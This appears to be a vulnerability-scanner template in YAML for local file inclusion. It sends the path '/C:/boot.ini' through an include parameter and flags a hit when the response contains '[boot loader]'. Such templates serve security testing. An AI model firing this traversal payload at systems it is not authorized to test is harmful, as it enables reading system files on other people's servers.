id: lfi6-1404
name: 'Traversal in include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - '/C:/boot.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[boot loader]'
